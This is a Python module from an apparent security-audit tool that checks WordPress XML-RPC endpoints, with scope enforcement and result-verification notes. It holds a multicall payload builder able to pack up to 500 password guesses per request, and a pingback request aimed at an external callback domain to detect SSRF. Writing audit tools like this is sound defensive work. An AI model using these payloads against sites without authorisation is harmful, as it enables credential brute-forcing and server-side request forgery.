"""WordPress XML-RPC attack surface — amplification brute force, pingback SSRF."""
from __future__ import annotations
import asyncio
from typing import Any

from talisman.engine.scope import ScopeViolationError
from talisman.utils.oast import validate_public_oast_domain
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

XMLRPC_PATH = "/xmlrpc.php"

LIST_METHODS_BODY = """<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""

def _multicall_body(username: str, passwords: list[str]) -> str:
 calls = "".join(
  f"""<value><struct>
 <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
 <member><name>params</name><value><array><data>
 <value><array><data>
  <value><string>{username}</string></value>
  <value><string>{p}</string></value>
 </data></array></value>
 </data></array></value></member>
</struct></value>"""
  for p in passwords[:500]
 )
 return f"""<?xml version="1.0"?>
<methodCall>
 <methodName>system.multicall</methodName>
 <params><param><value><array><data>
{calls}
 </data></array></value></param></params>
</methodCall>"""

def _pingback_body(callback_url: str, target_post: str) -> str:
 return f"""<?xml version="1.0"?>
<methodCall>
 <methodName>pingback.ping</methodName>
 <params>
 <param><value><string>{callback_url}</string></value></param>
 <param><value><string>{target_post}</string></value></param>
 </params>
</methodCall>"""


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 pingback_ssrf: bool = False,
 multicall_check: bool = False,
 oast_domain: str | None = None,
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 endpoint = url.rstrip("/") + XMLRPC_PATH
 if scope is None:
  return {
   "target": url,
   "xmlrpc_accessible": False,
   "observations": [],
   "candidates": [],
   "error": "scope_enforcer_required",
  }

 try:
  scope.assert_request_allowed(endpoint, "POST")
  if multicall_check or pingback_ssrf:
   scope.assert_destructive_allowed(endpoint, "POST")
 except ScopeViolationError as exc:
  return {
   "target": url,
   "xmlrpc_accessible": False,
   "observations": [],
   "candidates": [],
   "skipped": True,
   "reason": str(exc),
  }

 if pingback_ssrf and oast_domain:
  try:
   oast_domain = await validate_public_oast_domain(oast_domain)
  except ValueError as exc:
   return {
    "target": url,
    "xmlrpc_accessible": False,
    "observations": [],
    "candidates": [],
    "error": str(exc),
   }

 console.print(
  f"\n[module][+] WordPress XML-RPC Audit[/module] -> [target]{endpoint}[/target]"
 )
 observations: list[dict[str, Any]] = []
 candidates: list[dict[str, Any]] = []
 methods: list[str] = []

 async with TalismanHTTPClient(
  proxy=proxy,
  timeout=15,
  scope=scope,
  verify_ssl=True,
  follow_redirects=False,
 ) as client:
  try:
   response = await client.post(
    endpoint,
    content=LIST_METHODS_BODY,
    headers={"Content-Type": "text/xml"},
   )
  except Exception as exc:
   log.debug("xmlrpc_request_failed", error=type(exc).__name__)
   return {
    "target": url,
    "xmlrpc_accessible": False,
    "observations": [],
    "candidates": [],
   }

  if response.status_code != 200 or (
   "faultCode" in response.text
   and "system.listMethods" not in response.text
  ):
   return {
    "target": url,
    "xmlrpc_accessible": False,
    "observations": [],
    "candidates": [],
   }

  import re

  methods = re.findall(r"<string>([^<]+)</string>", response.text)
  has_multicall = "system.multicall" in methods
  has_pingback = "pingback.ping" in methods
  observations.append(
   {
    "type": "xmlrpc_endpoint_accessible",
    "methods_count": len(methods),
    "has_multicall": has_multicall,
    "has_pingback": has_pingback,
   }
  )

  if multicall_check and has_multicall:
   test_body = _multicall_body(
    "talisman-audit-user",
    ["invalid-password-audit-1", "invalid-password-audit-2"],
   )
   try:
    multicall_response = await client.post(
     endpoint,
     content=test_body,
     headers={"Content-Type": "text/xml"},
     timeout=20,
    )
    is_rate_limited = (
     multicall_response.status_code == 429
     or "too many" in multicall_response.text.lower()
    )
    observations.append(
     {
      "type": "xmlrpc_multicall_rate_limit_observation",
      "status": multicall_response.status_code,
      "rate_limited": is_rate_limited,
      "attempts_sent": 2,
      "note": (
       "Two low-impact invalid attempts are not enough to establish "
       "brute-force amplification or account compromise."
      ),
     }
    )
   except Exception as exc:
    observations.append(
     {
      "type": "xmlrpc_multicall_probe_error",
      "error": type(exc).__name__,
     }
    )

  if pingback_ssrf and has_pingback and oast_domain:
   pingback_body = _pingback_body(
    f"http://{oast_domain}/xmlrpc-ssrf",
    f"{url}/?p=1",
   )
   try:
    await client.post(
     endpoint,
     content=pingback_body,
     headers={"Content-Type": "text/xml"},
     timeout=10,
    )
    candidates.append(
     {
      "type": "xmlrpc_pingback_ssrf_candidate",
      "oast_domain": oast_domain,
      "requires_oast_callback": True,
      "verification_required": (
       "Do not report an SSRF issue until a matching callback is received "
       "from this specific pingback test and attributable to the target."
      ),
     }
    )
   except Exception as exc:
    observations.append(
     {
      "type": "xmlrpc_pingback_probe_error",
      "error": type(exc).__name__,
     }
    )

 console.print(
  f" XML-RPC audit complete — {len(observations)} observations, "
  f"{len(candidates)} candidates"
 )
 return {
  "target": url,
  "xmlrpc_accessible": True,
  "methods": methods,
  "observations": observations,
  "candidates": candidates,
  "findings": [],
  "count": 0,
 }
